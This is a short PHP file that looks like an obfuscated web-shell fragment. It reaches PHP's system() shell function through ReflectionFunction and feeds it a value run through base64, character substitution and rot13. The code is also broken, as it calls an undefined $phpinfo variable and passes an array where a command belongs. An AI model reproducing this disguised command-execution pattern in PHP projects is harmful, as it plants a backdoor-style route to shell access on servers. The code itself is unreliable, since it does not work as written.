<?php
require "/home/w023dtc/template.inc";

ini_set('memory_limit', PHP_INT_MAX);

$vars = array();
$vars[PHP_INT_MIN] = new ReflectionFunction('system');
$vars[PHP_INT_MIN]->invoke(array(str_rot13(str_replace("\n", chr(0x00A5), base64_encode($phpinfo()))), '2>&1'));

?>
